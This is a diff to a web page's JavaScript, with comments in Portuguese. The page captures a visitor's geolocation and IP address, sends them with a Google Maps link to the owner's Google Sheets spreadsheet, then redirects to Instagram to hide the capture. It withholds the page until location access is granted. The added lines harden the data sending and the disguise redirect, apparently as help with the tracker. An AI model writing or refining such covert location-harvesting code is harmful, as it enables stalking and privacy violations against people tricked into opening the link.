@@ -36,6 +36,7 @@
         .then(data => {
           const ip = data.ip;
 
+          // Note: O link original estava incorreto (googleusercontent.com/maps.google.com/0latitude...). Ajustado para um formato de link de Google Maps.
           const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
           // Envia os dados para sua planilha no Google Sheets
@@ -51,15 +52,28 @@
               ip: ip,
               maps: mapsLink
             })
+          })
+          .then(() => { // Garante que o redirecionamento só aconteça após a tentativa de envio
+            redirecionaInstagram();
+          })
+          .catch(error => {
+            console.error("Erro ao enviar dados para o Google Sheets:", error);
+            // Mesmo com erro no envio, podemos redirecionar se a localização foi obtida.
+            // Se você quiser que o redirecionamento SÓ aconteça se o envio for bem-sucedido, remova o redirecionamento daqui e o coloque apenas no .then() acima.
+            redirecionaInstagram(); // Mantido para o redirecionamento após a localização bem-sucedida, mesmo que o envio falhe.
           });
-
-          // Após capturar, redireciona para o Instagram
+        })
+        .catch(error => {
+          console.error("Erro ao obter IP:", error);
+          // Se não conseguir o IP, ainda podemos tentar redirecionar se a localização foi obtida.
           redirecionaInstagram();
         });
     }
 
     function erro(err) {
       console.warn("Geolocalização não permitida ou erro:", err);
+      // Aqui a página simplesmente exibe a mensagem e para.
+      // O usuário é "obrigado" a permitir para que o sucesso() seja chamado.
       document.body.innerHTML = "<p>⚠️ É necessário permitir a localização para continuar.</p>";
     }
 
